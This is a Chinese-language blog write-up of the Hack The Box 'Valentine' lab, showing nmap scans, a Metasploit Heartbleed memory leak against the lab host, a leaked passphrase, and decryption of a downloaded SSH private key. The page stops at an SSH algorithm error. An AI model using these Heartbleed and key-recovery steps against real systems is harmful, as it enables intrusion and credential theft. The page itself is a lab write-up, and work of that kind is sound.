<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>打靶记录(一二四)之HTBValentine | MikannseのSekai</title><meta name="author" content="Mikannse"><meta name="copyright" content="Mikannse"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="端口扫描┌──(mikannse㉿kali)-[~]└─$ sudo nmap --min-rate&#x3D;10000 -p- 10.10.10.79Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-09-03 11:35 CSTWarning: 10.10.10.79 giving up on port because retransmission">
<meta property="og:type" content="article">
<meta property="og:title" content="打靶记录(一二四)之HTBValentine">
<meta property="og:url" content="http://mikannse.space/2024/09/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%BA%8C%E5%9B%9B)%E4%B9%8BHTBValentine/index.html">
<meta property="og:site_name" content="MikannseのSekai">
<meta property="og:description" content="端口扫描┌──(mikannse㉿kali)-[~]└─$ sudo nmap --min-rate&#x3D;10000 -p- 10.10.10.79Starting Nmap 7.94SVN ( https:&#x2F;&#x2F;nmap.org ) at 2024-09-03 11:35 CSTWarning: 10.10.10.79 giving up on port because retransmission">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg">
<meta property="article:published_time" content="2024-09-03T05:31:21.000Z">
<meta property="article:modified_time" content="2024-09-03T05:32:39.115Z">
<meta property="article:author" content="Mikannse">
<meta property="article:tag" content="渗透测试">
<meta property="article:tag" content="打靶">
<meta property="article:tag" content="linux">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg"><link rel="shortcut icon" href="/img/icon.jpg"><link rel="canonical" href="http://mikannse.space/2024/09/03/%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95(%E4%B8%80%E4%BA%8C%E5%9B%9B)%E4%B9%8BHTBValentine/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"簡"},
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '天',
  dateSuffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Mikannse","link":"链接: ","source":"来源: MikannseのSekai","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: '打靶记录(一二四)之HTBValentine',
  isPost: true,
  isHome: false,
  isHighlightShrink: undefined,
  isToc: true,
  postUpdate: '2024-09-03 13:32:39'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
      const link = document.createElement('link')
      link.rel = 'stylesheet'
      link.href = url
      if (id) link.id = id
      link.onerror = reject
      link.onload = link.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        link.onload = link.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(link)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">加载中...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load',() => { preloader.endLoading() })

  if (true) {
    document.addEventListener('pjax:send', () => { preloader.initLoading() })
    document.addEventListener('pjax:complete', () => { preloader.endLoading() })
  }
})()</script><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://s2.loli.net/2023/06/22/PMAjL6lORKa5CGy.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">313</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">74</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">4</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://cdn.jsdelivr.net/gh/yjr-1100/Photobag/githubioimg/background_4k.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="MikannseのSekai"><span class="site-name">MikannseのSekai</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 文章</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">打靶记录(一二四)之HTBValentine</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2024-09-03T05:31:21.000Z" title="发表于 2024-09-03 13:31:21">2024-09-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2024-09-03T05:32:39.115Z" title="更新于 2024-09-03 13:32:39">2024-09-03</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E5%AE%89/">网安</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>12分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="打靶记录(一二四)之HTBValentine"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap --min-rate=10000 -p- 10.10.10.79</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 11:35 CST</span><br><span class="line">Warning: 10.10.10.79 giving up on port because retransmission cap hit (10).</span><br><span class="line">Nmap scan report for 10.10.10.79</span><br><span class="line">Host is up (0.072s latency).</span><br><span class="line">Not shown: 65532 closed tcp ports (reset)</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">443/tcp open  https</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 11.00 seconds</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap -sT -sV -sC -O -p22,80,443 10.10.10.79</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 11:36 CST</span><br><span class="line">Nmap scan report for 10.10.10.79</span><br><span class="line">Host is up (0.073s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE  VERSION</span><br><span class="line">22/tcp  open  ssh      OpenSSH 5.9p1 Debian 5ubuntu1.10 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 96:4c:51:42:3c:ba:22:49:20:4d:3e:ec:90:cc:fd:0e (DSA)</span><br><span class="line">|   2048 46:bf:1f:cc:92:4f:1d:a0:42:b3:d2:16:a8:58:31:33 (RSA)</span><br><span class="line">|_  256 e6:2b:25:19:cb:7e:54:cb:0a:b9:ac:16:98:c6:7d:a9 (ECDSA)</span><br><span class="line">80/tcp  open  http     Apache httpd 2.2.22 ((Ubuntu))</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">443/tcp open  ssl/http Apache httpd 2.2.22 ((Ubuntu))</span><br><span class="line">| ssl-cert: Subject: commonName=valentine.htb/organizationName=valentine.htb/stateOrProvinceName=FL/countryName=US</span><br><span class="line">| Not valid before: 2018-02-06T00:45:25</span><br><span class="line">|_Not valid after:  2019-02-06T00:45:25</span><br><span class="line">|_http-server-header: Apache/2.2.22 (Ubuntu)</span><br><span class="line">|_ssl-date: 2024-09-03T03:27:14+00:00; -9m59s from scanner time.</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Aggressive OS guesses: Nokia N9 phone (Linux 2.6.32) (96%), Linux 3.0 (96%), Linux 2.6.32 - 3.5 (95%), Linux 3.2 (95%), Linux 2.6.38 - 3.0 (94%), Linux 2.6.38 - 2.6.39 (94%), Linux 2.6.39 (94%), Linux 3.5 (93%), Linux 2.6.32 - 3.10 (93%), Linux 2.6.32 - 3.9 (93%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Host script results:</span><br><span class="line">|_clock-skew: -9m59s</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 25.95 seconds</span><br></pre></td></tr></tbody></table></figure>

<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~]</span><br><span class="line">└─$ sudo nmap --script=vuln -p22,80,443 10.10.10.79</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-09-03 11:38 CST</span><br><span class="line">Nmap scan report for 10.10.10.79</span><br><span class="line">Host is up (0.43s latency).</span><br><span class="line"></span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">22/tcp  open  ssh</span><br><span class="line">80/tcp  open  http</span><br><span class="line">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.</span><br><span class="line">|_http-csrf: Couldn't find any CSRF vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn't find any DOM based XSS.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'</span><br><span class="line">|_  /index/: Potentially interesting folder</span><br><span class="line">443/tcp open  https</span><br><span class="line">|_http-csrf: Couldn't find any CSRF vulnerabilities.</span><br><span class="line">|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.</span><br><span class="line">| ssl-heartbleed: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     Risk factor: High</span><br><span class="line">|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.</span><br><span class="line">|           </span><br><span class="line">|     References:</span><br><span class="line">|       http://www.openssl.org/news/secadv_20140407.txt </span><br><span class="line">|       http://cvedetails.com/cve/2014-0160/</span><br><span class="line">|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160</span><br><span class="line">|_http-dombased-xss: Couldn't find any DOM based XSS.</span><br><span class="line">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| ssl-ccs-injection: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL/TLS MITM vulnerability (CCS Injection)</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     Risk factor: High</span><br><span class="line">|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h</span><br><span class="line">|       does not properly restrict processing of ChangeCipherSpec messages,</span><br><span class="line">|       which allows man-in-the-middle attackers to trigger use of a zero</span><br><span class="line">|       length master key in certain OpenSSL-to-OpenSSL communications, and</span><br><span class="line">|       consequently hijack sessions or obtain sensitive information, via</span><br><span class="line">|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.</span><br><span class="line">|           </span><br><span class="line">|     References:</span><br><span class="line">|       http://www.openssl.org/news/secadv_20140605.txt</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224</span><br><span class="line">|_      http://www.cvedetails.com/cve/2014-0224</span><br><span class="line">| ssl-poodle: </span><br><span class="line">|   VULNERABLE:</span><br><span class="line">|   SSL POODLE information leak</span><br><span class="line">|     State: VULNERABLE</span><br><span class="line">|     IDs:  BID:70574  CVE:CVE-2014-3566</span><br><span class="line">|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other</span><br><span class="line">|           products, uses nondeterministic CBC padding, which makes it easier</span><br><span class="line">|           for man-in-the-middle attackers to obtain cleartext data via a</span><br><span class="line">|           padding-oracle attack, aka the "POODLE" issue.</span><br><span class="line">|     Disclosure date: 2014-10-14</span><br><span class="line">|     Check results:</span><br><span class="line">|       TLS_RSA_WITH_AES_128_CBC_SHA</span><br><span class="line">|     References:</span><br><span class="line">|       https://www.openssl.org/~bodo/ssl-poodle.pdf</span><br><span class="line">|       https://www.imperialviolet.org/2014/10/14/poodle.html</span><br><span class="line">|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566</span><br><span class="line">|_      https://www.securityfocus.com/bid/70574</span><br><span class="line">|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">| http-enum: </span><br><span class="line">|   /dev/: Potentially interesting directory w/ listing on 'apache/2.2.22 (ubuntu)'</span><br><span class="line">|_  /index/: Potentially interesting folder</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 52.34 seconds</span><br></pre></td></tr></tbody></table></figure>

<p>通过扫描结果，得知存在heartbleed漏洞</p>
<h1 id="HeartBleed"><a href="#HeartBleed" class="headerlink" title="HeartBleed"></a>HeartBleed</h1><p>使用msf模块</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~]</span><br><span class="line">└─$ msfconsole -q          </span><br><span class="line">msf6 &gt; search heartbleed</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   #  Name                                                    Disclosure Date  Rank    Check  Description</span><br><span class="line">   -  ----                                                    ---------------  ----    -----  -----------</span><br><span class="line">   0  auxiliary/scanner/http/elasticsearch_memory_disclosure  2021-07-21       normal  Yes    Elasticsearch Memory Disclosure</span><br><span class="line">   1    \_ action: DUMP                                       .                .       .      Dump memory contents to loot</span><br><span class="line">   2    \_ action: SCAN                                       .                .       .      Check hosts for vulnerability</span><br><span class="line">   3  auxiliary/server/openssl_heartbeat_client_memory        2014-04-07       normal  No     OpenSSL Heartbeat (Heartbleed) Client Memory Exposure</span><br><span class="line">   4  auxiliary/scanner/ssl/openssl_heartbleed                2014-04-07       normal  Yes    OpenSSL Heartbeat (Heartbleed) Information Leak</span><br><span class="line">   5    \_ action: DUMP                                       .                .       .      Dump memory contents to loot</span><br><span class="line">   6    \_ action: KEYS                                       .                .       .      Recover private keys from memory</span><br><span class="line">   7    \_ action: SCAN                                       .                .       .      Check hosts for vulnerability</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Interact with a module by name or index. For example info 7, use 7 or use auxiliary/scanner/ssl/openssl_heartbleed                                                                                        </span><br><span class="line">After interacting with a module you can manually set a ACTION with set ACTION 'SCAN'</span><br><span class="line"></span><br><span class="line">msf6 &gt; use 4</span><br><span class="line">msf6 auxiliary(scanner/ssl/openssl_heartbleed) &gt; options</span><br><span class="line"></span><br><span class="line">Module options (auxiliary/scanner/ssl/openssl_heartbleed):</span><br><span class="line"></span><br><span class="line">   Name              Current Setting  Required  Description</span><br><span class="line">   ----              ---------------  --------  -----------</span><br><span class="line">   DUMPFILTER                         no        Pattern to filter leaked memory before storing</span><br><span class="line">   LEAK_COUNT        1                yes       Number of times to leak memory per SCAN or DUMP inv</span><br><span class="line">                                                ocation</span><br><span class="line">   MAX_KEYTRIES      50               yes       Max tries to dump key</span><br><span class="line">   RESPONSE_TIMEOUT  10               yes       Number of seconds to wait for a server response</span><br><span class="line">   RHOSTS                             yes       The target host(s), see https://docs.metasploit.com</span><br><span class="line">                                                /docs/using-metasploit/basics/using-metasploit.html</span><br><span class="line">   RPORT             443              yes       The target port (TCP)</span><br><span class="line">   STATUS_EVERY      5                yes       How many retries until key dump status</span><br><span class="line">   THREADS           1                yes       The number of concurrent threads (max one per host)</span><br><span class="line">   TLS_CALLBACK      None             yes       Protocol to use, "None" to use raw TLS sockets (Acc</span><br><span class="line">                                                epted: None, SMTP, IMAP, JABBER, POP3, FTP, POSTGRE</span><br><span class="line">                                                S)</span><br><span class="line">   TLS_VERSION       1.0              yes       TLS/SSL version to use (Accepted: SSLv3, 1.0, 1.1,</span><br><span class="line">                                                1.2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Auxiliary action:</span><br><span class="line"></span><br><span class="line">   Name  Description</span><br><span class="line">   ----  -----------</span><br><span class="line">   SCAN  Check hosts for vulnerability</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">View the full module info with the info, or info -d command.</span><br><span class="line"></span><br><span class="line">msf6 auxiliary(scanner/ssl/openssl_heartbleed) &gt; set rhost 10.10.10.79</span><br><span class="line">rhost =&gt; 10.10.10.79</span><br><span class="line">msf6 auxiliary(scanner/ssl/openssl_heartbleed) &gt; set verbose true</span><br><span class="line">verbose =&gt; true</span><br><span class="line">msf6 auxiliary(scanner/ssl/openssl_heartbleed) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 10.10.10.79:443       - Leaking heartbeat response #1</span><br><span class="line">[*] 10.10.10.79:443       - Sending Client Hello...</span><br><span class="line">[*] 10.10.10.79:443       - SSL record #1:</span><br><span class="line">[*] 10.10.10.79:443       -     Type:    22</span><br><span class="line">[*] 10.10.10.79:443       -     Version: 0x0301</span><br><span class="line">[*] 10.10.10.79:443       -     Length:  86</span><br><span class="line">[*] 10.10.10.79:443       -     Handshake #1:</span><br><span class="line">[*] 10.10.10.79:443       -             Length: 82</span><br><span class="line">[*] 10.10.10.79:443       -             Type:   Server Hello (2)</span><br><span class="line">[*] 10.10.10.79:443       -             Server Hello Version:           0x0301</span><br><span class="line">[*] 10.10.10.79:443       -             Server Hello random data:       66d683c08caa0559880124b5720b8eb667630e99b9794fee5af376064e4ae3ae</span><br><span class="line">[*] 10.10.10.79:443       -             Server Hello Session ID length: 32</span><br><span class="line">[*] 10.10.10.79:443       -             Server Hello Session ID:        bb4cbecd3738c67f3cfb7424b65513f5b225202411b3022fb5acd805d6b8dd87</span><br><span class="line">[*] 10.10.10.79:443       - SSL record #2:</span><br><span class="line">[*] 10.10.10.79:443       -     Type:    22</span><br><span class="line">[*] 10.10.10.79:443       -     Version: 0x0301</span><br><span class="line">[*] 10.10.10.79:443       -     Length:  885</span><br><span class="line">[*] 10.10.10.79:443       -     Handshake #1:</span><br><span class="line">[*] 10.10.10.79:443       -             Length: 881</span><br><span class="line">[*] 10.10.10.79:443       -             Type:   Certificate Data (11)</span><br><span class="line">[*] 10.10.10.79:443       -             Certificates length: 878</span><br><span class="line">[*] 10.10.10.79:443       -             Data length: 881</span><br><span class="line">[*] 10.10.10.79:443       -             Certificate #1:</span><br><span class="line">[*] 10.10.10.79:443       -                     Certificate #1: Length: 875</span><br><span class="line">[*] 10.10.10.79:443       -                     Certificate #1: #&lt;OpenSSL::X509::Certificate: subject=#&lt;OpenSSL::X509::Name CN=valentine.htb,O=valentine.htb,ST=FL,C=US&gt;, issuer=#&lt;OpenSSL::X509::Name CN=valentine.htb,O=valentine.htb,ST=FL,C=US&gt;, serial=#&lt;OpenSSL::BN:0x00007f80be38c098&gt;, not_before=2018-02-06 00:45:25 UTC, not_after=2019-02-06 00:45:25 UTC&gt;</span><br><span class="line">[*] 10.10.10.79:443       - SSL record #3:</span><br><span class="line">[*] 10.10.10.79:443       -     Type:    22</span><br><span class="line">[*] 10.10.10.79:443       -     Version: 0x0301</span><br><span class="line">[*] 10.10.10.79:443       -     Length:  331</span><br><span class="line">[*] 10.10.10.79:443       -     Handshake #1:</span><br><span class="line">[*] 10.10.10.79:443       -             Length: 327</span><br><span class="line">[*] 10.10.10.79:443       -             Type:   Server Key Exchange (12)</span><br><span class="line">[*] 10.10.10.79:443       - SSL record #4:</span><br><span class="line">[*] 10.10.10.79:443       -     Type:    22</span><br><span class="line">[*] 10.10.10.79:443       -     Version: 0x0301</span><br><span class="line">[*] 10.10.10.79:443       -     Length:  4</span><br><span class="line">[*] 10.10.10.79:443       -     Handshake #1:</span><br><span class="line">[*] 10.10.10.79:443       -             Length: 0</span><br><span class="line">[*] 10.10.10.79:443       -             Type:   Server Hello Done (14)</span><br><span class="line">[*] 10.10.10.79:443       - Sending Heartbeat...</span><br><span class="line">[*] 10.10.10.79:443       - Heartbeat response, 65535 bytes</span><br><span class="line">[+] 10.10.10.79:443       - Heartbeat response with leak, 65535 bytes</span><br><span class="line">[*] 10.10.10.79:443       - Printable info leaked:</span><br></pre></td></tr></tbody></table></figure>

<p>在里面找到了一串比较可疑的hash:b9597dc55b21a2759b480fb102f9999a,但是解密不出来,搜索发现msf的模块似乎有时候并不是很准确，于是使用/usr/share/exploitdb/exploits/multiple/remote/32745.py</p>
<p>找到一串base64编码:aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg==,解码得到:heartbleedbelievethehype,看上去像是密码，但是没有用户。回到web页面，nmap扫描结果有一个/dev,里面有一个hype_key，是hex，解码后发现是一个密钥，但是怎么样都使用不了，猜想是因为cyberchef的解码结果中带有ascii旁注，于是:</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/valentine]</span><br><span class="line">└─$ wget http://10.10.10.79/dev/hype_key  </span><br><span class="line">--2024-09-03 12:20:47--  http://10.10.10.79/dev/hype_key</span><br><span class="line">Connecting to 10.10.10.79:80... connected.</span><br><span class="line">HTTP request sent, awaiting response... 200 OK</span><br><span class="line">Length: 5383 (5.3K)</span><br><span class="line">Saving to: ‘hype_key’</span><br><span class="line"></span><br><span class="line">hype_key                  100%[==================================&gt;]   5.26K  1.44KB/s    in 3.7s    </span><br><span class="line"></span><br><span class="line">2024-09-03 12:20:51 (1.44 KB/s) - ‘hype_key’ saved [5383/5383]</span><br><span class="line">                                                                                                    </span><br><span class="line">┌──(mikannse㉿kali)-[~/valentine]</span><br><span class="line">└─$ cat hype_key|xxd -r -p &gt;key</span><br></pre></td></tr></tbody></table></figure>

<p>然而发现这个密钥是被加密过的，使用之前得到的那串来解密</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">┌──(mikannse㉿kali)-[~/valentine]</span><br><span class="line">└─$ openssl rsa -in key -out real_key</span><br><span class="line">Enter pass phrase for key:</span><br><span class="line">writing RSA key</span><br></pre></td></tr></tbody></table></figure>

<p>但是在使用的时候还是报错了加密方式错误的问题(sign_and_send_pubkey: no mutual signature supported),ssh-rsa算法在新版本客户端中默认禁用，于是手动指定</p>
